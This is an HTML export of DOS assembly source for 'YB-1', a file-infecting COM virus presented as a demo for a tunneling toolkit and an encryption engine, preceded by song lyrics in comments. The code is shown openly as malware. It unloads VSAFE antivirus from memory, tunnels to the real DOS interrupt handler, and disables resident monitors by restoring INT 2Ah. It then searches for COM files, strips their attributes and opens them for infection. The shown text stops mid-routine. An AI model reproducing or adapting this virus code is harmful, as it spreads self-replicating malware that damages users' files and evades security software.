<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment #  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   PRE-IGNITION</span><span class="sc0">
</span><span class="sc1">;   Hey you...</span><span class="sc0">
</span><span class="sc1">;   Tell me, what's your call name</span><span class="sc0">
</span><span class="sc1">;   Closed, negative display</span><span class="sc0">
</span><span class="sc1">;   Engaged on section three</span><span class="sc0">
</span><span class="sc1">;   The acrid factories</span><span class="sc0">
</span><span class="sc1">;   You...</span><span class="sc0">
</span><span class="sc1">;   Putrid perfect product</span><span class="sc0">
</span><span class="sc1">;   Proper platinum parts</span><span class="sc0">
</span><span class="sc1">;   Proficient prototypes</span><span class="sc0">
</span><span class="sc1">;   Steadily spew from these pipes</span><span class="sc0">
</span><span class="sc1">;   Are you...</span><span class="sc0">
</span><span class="sc1">;   The prime automaton</span><span class="sc0">
</span><span class="sc1">;   Christened as YB-1</span><span class="sc0">
</span><span class="sc1">;   Hey you...</span><span class="sc0">
</span><span class="sc1">;   Generated by waste</span><span class="sc0">
</span><span class="sc1">;   Arid quarry displaced</span><span class="sc0">
</span><span class="sc1">;   Enviro-mental squeeze</span><span class="sc0">
</span><span class="sc1">;   Aluminum disease</span><span class="sc0">
</span><span class="sc1">;   You...</span><span class="sc0">
</span><span class="sc1">;   Conscious of origin</span><span class="sc0">
</span><span class="sc1">;   Intention in the wind</span><span class="sc0">
</span><span class="sc1">;   Atmosphere infected</span><span class="sc0">
</span><span class="sc1">;   Descendants defected</span><span class="sc0">
</span><span class="sc1">;   Are you...</span><span class="sc0">
</span><span class="sc1">;   Novel stroke of design</span><span class="sc0">
</span><span class="sc1">;   Or relics from this mine</span><span class="sc0">
</span><span class="sc1">;   Casually, choke,</span><span class="sc0">
</span><span class="sc1">;   Noxious nourishment</span><span class="sc0">
</span><span class="sc1">;   Embodied, illicit cure</span><span class="sc0">
</span><span class="sc1">;   Ground and rock and sand</span><span class="sc0">
</span><span class="sc1">;   Come crumble tumble down</span><span class="sc0">
</span><span class="sc1">;   Grinding round</span><span class="sc0">
</span><span class="sc1">;   The hydraulic wheel</span><span class="sc0">
</span><span class="sc1">;   Extraction,</span><span class="sc0">
</span><span class="sc1">;   For ultimate greed</span><span class="sc0">
</span><span class="sc1">;   Now... hidden from view</span><span class="sc0">
</span><span class="sc1">;   Surveying stable shifts</span><span class="sc0">
</span><span class="sc1">;   A feeble groove</span><span class="sc0">
</span><span class="sc1">;   Unintentional split</span><span class="sc0">
</span><span class="sc1">;   Then they return to work</span><span class="sc0">
</span><span class="sc1">;   As if they're not disturbed</span><span class="sc0">
</span><span class="sc1">;   Cybernetic beings</span><span class="sc0">
</span><span class="sc1">;   Omniscient regiment</span><span class="sc0">
</span><span class="sc1">;   Thriving with vigor</span><span class="sc0">
</span><span class="sc1">;   Incessant loop</span><span class="sc0">
</span><span class="sc1">;   An assumed order</span><span class="sc0">
</span><span class="sc1">;   Auspicious tool</span><span class="sc0">
</span><span class="sc1">;   Frantically, flow</span><span class="sc0">
</span><span class="sc1">;   Spumous sediment</span><span class="sc0">
</span><span class="sc1">;   Remedied, neurotic fuse</span><span class="sc0">
</span><span class="sc1">;   Ground and rock and sand</span><span class="sc0">
</span><span class="sc1">;   Come crumble tumble down</span><span class="sc0">
</span><span class="sc1">;   Yonder sound, an echoing gong</span><span class="sc0">
</span><span class="sc1">;   Disjunction</span><span class="sc0">
</span><span class="sc1">;   Of their disowned song</span><span class="sc0">
</span><span class="sc1">;   Now... some are set free</span><span class="sc0">
</span><span class="sc1">;   Emotions flood their gaze</span><span class="sc0">
</span><span class="sc1">;   Synthetic breed</span><span class="sc0">
</span><span class="sc1">;   The pre-ignition phase</span><span class="sc0">
</span><span class="sc1">;   Pre-ignition</span><span class="sc0">
</span><span class="sc1">;   Flares up in you</span><span class="sc0">
</span><span class="sc1">;   Pre-ignition</span><span class="sc0">
</span><span class="sc1">;   Provokes me too.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; #</span><span class="sc0">

</span><span class="sc1">;**********************************************************************</span><span class="sc0">
</span><span class="sc1">; YB-1.ASM  </span><span class="sc0">
</span><span class="sc1">; AUTHOR:  Khntark</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Demonstration Virus for Khntark's Recursive Tunneling Toolkit 4.1</span><span class="sc0">
</span><span class="sc1">; Demonstrates how to use KRTT 4.1 in conjunction with TpE 1.3.</span><span class="sc0">
</span><span class="sc1">; Please note that this is another 'unremarkable' computer virus.</span><span class="sc0">
</span><span class="sc1">; It is just a demo.</span><span class="sc0">
</span><span class="sc1">;**********************************************************************</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">rnd_init</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">       </span><span class="sc1">;TpE</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">          </span><span class="sc1">;TpE</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">tunnel</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">;KRTT 4.1</span><span class="sc0">

</span><span class="sc5">MAIN</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">main</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">main</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">      </span><span class="sc1">;all part in one segment=com file</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc1">;**********************************</span><span class="sc0">
</span><span class="sc1">;  fake host program</span><span class="sc0">
</span><span class="sc1">;**********************************</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">          </span><span class="sc1">;jmp    NEAR PTR VIRUS</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21H</span><span class="sc0">                 </span><span class="sc1">;terminate normally with dos</span><span class="sc0">

</span><span class="sc1">;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

</span><span class="sc1">;**********************************</span><span class="sc0">
</span><span class="sc1">; VIRUS CODE STARTS HERE</span><span class="sc0">
</span><span class="sc1">;**********************************</span><span class="sc0">


</span><span class="sc5">VIRUS</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;a label for the first byte of the virus</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_ENTRY_PT</span><span class="sc0">           </span><span class="sc1">;when call is performed absolute address goes to stack</span><span class="sc0">
                            
</span><span class="sc5">GET_ENTRY_PT</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">GET_ENTRY_PT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0">  </span><span class="sc1">;fix absolute address</span><span class="sc0">

</span><span class="sc1">;************************************           </span><span class="sc0">
</span><span class="sc1">; restore 4 original bytes to file</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">
           
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                </span><span class="sc1">;save si</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">                                    </span><span class="sc1">;clear direction flag</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">START_CODE</span><span class="sc4">-</span><span class="sc5">VIRUS</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
           </span><span class="sc6">movsw</span><span class="sc0">                                  </span><span class="sc1">;this is shorter &amp; faster than </span><span class="sc0">
           </span><span class="sc6">movsw</span><span class="sc0">                                  </span><span class="sc1">;mov cx,04 and rep movsb</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">                                </span><span class="sc1">;restore si</span><span class="sc0">

</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; REMOVE CPAV-MSAV VSAFE FROM MEMORY</span><span class="sc0">
</span><span class="sc1">; (if present)</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">5945h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FA01h</span><span class="sc0">    </span><span class="sc1">;AL=01 very important!</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;************************************           </span><span class="sc0">
</span><span class="sc1">; call KRTT 4.1</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                </span><span class="sc1">;save es</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">TUNNEL</span><span class="sc0">            </span><span class="sc1">;call KTTR 4.1</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                </span><span class="sc1">;restore es</span><span class="sc0">
           
            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">             </span><span class="sc1">;int 21h found?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">CONTINU</span><span class="sc0">           </span><span class="sc1">;go on if so</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">             </span><span class="sc1">;int 21h not hooked?</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">EXIT_VIRUS2</span><span class="sc0">       </span><span class="sc1">;exit if not</span><span class="sc0">

</span><span class="sc1">;************************************           </span><span class="sc0">
</span><span class="sc1">; save INT 21h address if found</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

</span><span class="sc5">CONTINU</span><span class="sc4">:</span><span class="sc0">           
           </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">        </span><span class="sc1">;int 21h offset    </span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">VIRUS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">;int 21h segment</span><span class="sc0">

</span><span class="sc1">;************************************           </span><span class="sc0">
</span><span class="sc1">; CHECK INT 2Ah</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

</span><span class="sc1">; NOTE: INT 2A points to a IRET in all DOS versions. This interrupt is hooked</span><span class="sc0">
</span><span class="sc1">; by NETWARE &amp; similar software so a check is made to see if such programs are</span><span class="sc0">
</span><span class="sc1">; present.</span><span class="sc0">
</span><span class="sc1">; A Russian resident monitoring program hooks this vector as it it called</span><span class="sc0">
</span><span class="sc1">; from within DOS's INT 21h in all file openings. (INT 21h, AH=3D)</span><span class="sc0">
</span><span class="sc1">; Restoring the original INT 2A defeats effectively such program.</span><span class="sc0">

            
            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">             </span><span class="sc1">;search for INT 2A</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                </span><span class="sc1">;save es</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">TUNNEL</span><span class="sc0">            </span><span class="sc1">;call KTTR 4.1</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                </span><span class="sc1">;restore es</span><span class="sc0">
           
            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">             </span><span class="sc1">;int 2Ah not hooked?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">INT_2A_OK</span><span class="sc0">         </span><span class="sc1">;proceed</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">              </span><span class="sc1">;int 2ah found?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">CHECK_INT_2A</span><span class="sc0">       </span><span class="sc1">;exit if not</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EXIT_VIRUS2</span><span class="sc0">

</span><span class="sc5">CHECK_INT_2A</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">2Ah</span><span class="sc0">           </span><span class="sc1">;check for Netware, etc.</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
              </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">EXIT_VIRUS2</span><span class="sc0">

              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;save es</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                           </span><span class="sc1">;bx=0</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                           </span><span class="sc1">;es=0</span><span class="sc0">
              </span><span class="sc6">cli</span><span class="sc0">                                  </span><span class="sc1">;disable interrupts</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">        </span><span class="sc1">;restore int 2A offset</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;restore int 2A segment</span><span class="sc0">
              </span><span class="sc6">sti</span><span class="sc0">                                  </span><span class="sc1">;enable interrupts</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;restore es</span><span class="sc0">

</span><span class="sc5">INT_2A_OK</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;************************************           </span><span class="sc0">
</span><span class="sc1">; redirect DTA onto virus code</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">
           
   </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;put DTA at the end of the virus for now</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                            </span><span class="sc1">;set new DTA function</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; Routines called from here           </span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_FILE</span><span class="sc0">       </span><span class="sc1">;get a com file to attack!</span><span class="sc0">

</span><span class="sc1">;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

</span><span class="sc5">EXIT_VIRUS</span><span class="sc4">:</span><span class="sc0">
           
</span><span class="sc1">;************************************</span><span class="sc0">
</span><span class="sc1">; set old  DTA  address</span><span class="sc0">
</span><span class="sc1">;************************************</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">            </span><span class="sc1">;fix dta back to return control to</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">               </span><span class="sc1">;host program</span><span class="sc0">

</span><span class="sc5">EXIT_VIRUS2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;****************************************************************</span><span class="sc0">
</span><span class="sc1">; zero out registers for return to</span><span class="sc0">
</span><span class="sc1">; host program</span><span class="sc0">
</span><span class="sc1">;****************************************************************</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">     
 </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">;zero regs</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">;save return address in stack</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">               </span><span class="sc1">;back to com host</span><span class="sc0">

</span><span class="sc1">;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

</span><span class="sc5">FIND_FILE</span><span class="sc4">:</span><span class="sc0">
                
                </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FILES_TO_INFECT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">   </span><span class="sc1">;do DOS search 1st function</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">   </span><span class="sc1">;search for any file, with any attributes</span><span class="sc0">

</span><span class="sc5">NEXT_FILE</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">NO_MO</span><span class="sc0">               </span><span class="sc1">;return if not zero</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CHECK_N_INFECT_FILE</span><span class="sc0"> </span><span class="sc1">;check file if file found</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">              </span><span class="sc1">;file no good..find next function</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">NEXT_FILE</span><span class="sc0">           </span><span class="sc1">;test next file for validity</span><span class="sc0">

</span><span class="sc5">NO_MO</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">
</span><span class="sc5">NO_GOOD</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GET_OUT</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CHECK_N_INFECT_FILE</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;*********************************************</span><span class="sc0">
</span><span class="sc1">; 1-Set attributes</span><span class="sc0">
</span><span class="sc1">;*********************************************</span><span class="sc0">
       
       </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_Name</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;dx = DTA filename ptr</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">;clear attributes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                           </span><span class="sc1">;set file attributes to cx</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">;save flags</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;call real int21h</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">NO_MO</span><span class="sc0">                              </span><span class="sc1">;error.. quit</span><span class="sc0">

</span><span class="sc1">;*****************</span><span class="sc0">
</span><span class="sc1">; 2-OPEN FILE</span><span class="sc0">
</span><span class="sc1">;*****************</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                                </span><span class="sc1">;r/w access to it</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">                                        </span><span class="sc1">;save flags</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;call real int21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                                 </span><span class="sc1">;error.. quit</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                   </span><span class="sc1">;bx = file handle</span><span class="sc0">

</span><span class="sc1">;********************</span><span class="sc0">
</span><span class="sc1">; 3-Read 1st 5 bytes</span><span class="sc0">
</span><span class="sc1">;********************</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                                       </span><span class="sc1">;read first 5 bytes of file</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;store'em here</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                                     </span><span class="sc1">;DOS read function</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">                                           </span><span class="sc1">;save flags</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;call real int21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                                    </span><span class="sc1">;error? get next file</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; 4-CHECK FILE</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_SIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get file's size</span><span class="sc0">
